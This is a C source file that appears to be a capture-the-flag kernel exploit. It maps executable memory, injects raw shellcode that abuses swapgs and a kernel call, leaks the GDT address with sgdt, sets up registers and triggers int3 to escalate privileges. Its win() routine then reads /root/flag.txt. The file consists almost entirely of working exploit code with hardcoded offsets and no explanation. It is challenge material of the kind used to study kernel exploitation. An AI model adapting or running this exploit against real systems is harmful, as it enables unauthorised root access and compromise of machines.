#include <ctype.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

int arch_prctl(int op, void *addr)
{
    return syscall(SYS_arch_prctl, op, addr);
}

void swapgs(void)
{
    asm("swapgs");
}

void wrgsbase(uint64_t gsbase)
{
    asm(
        "movq %0, %%rbx\n"
        "wrgsbase %%rbx\n" ::"r"(gsbase));
}

void win(void)
{
    int fd = open("/root/flag.txt", O_RDONLY);
    char buf[0x100];
    read(fd, buf, 0x100);
    write(STDOUT_FILENO, buf, 0x100);
}

#define SHELLCODE "\x0F\x01\xF8\x49\xB8\x04\x00\x00\x00\x00\xFE\xFF\xFF\x4D\x8B\x00\x49\x81\xE8\x00\x8E\x80\x00\x4D\x89\xC1\x49\x81\xC1\x30\xB4\x09\x00\x4C\x89\xC7\x48\x81\xC7\x40\x8D\xE3\x00\x41\xFF\xD1\x0F\x01\xF8\x6A\x2B\x68\x00\xF0\xEA\x0D\x68\x06\x02\x00\x00\x6A\x33\x68\x06\x13\x40\x00\x48\xCF"

int main(void)
{
    void *shellcode;

    shellcode = mmap(0xdead000, 0x30000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED_NOREPLACE | MAP_POPULATE, -1, 0);
    if (shellcode == MAP_FAILED)
        fatal("mmap");

    memset(shellcode, '\x90', 0x1000);
    memcpy(shellcode, SHELLCODE, sizeof(SHELLCODE) - 1);

    printf("stack: %#lx\n", shellcode);

    arch_prctl(0x1001, shellcode);

    char buf[0x10];
    uint64_t gdt;
    asm("sgdt %0" : "m="(buf));

    gdt = *(uint64_t *)(buf + 2);

    printf("gdt: %#lx", gdt);

    *(uint64_t *)(shellcode + 0x21458) = gdt + 0x1f50 + 0xa8;

    swapgs();

    asm(
        "mov $1, %rax\n"
        "mov $2, %rbx\n"
        "mov $3, %rcx\n"
        "mov $4, %rdx\n"
        "mov $5, %rsp\n"
        "mov $6, %rbp\n"
        "mov $7, %rsi\n"
        "mov $8, %rdi\n"
        "mov $9, %r8\n"
        "mov $10, %r9\n"
        "mov $11, %r10\n"
        "mov $12, %r11\n"
        "mov $13, %r12\n"
        "mov $14, %r13\n"
        "mov $15, %r14\n"
        "mov $0xdead000, %r15\n");

    asm("int $3\n");

    return 0;
}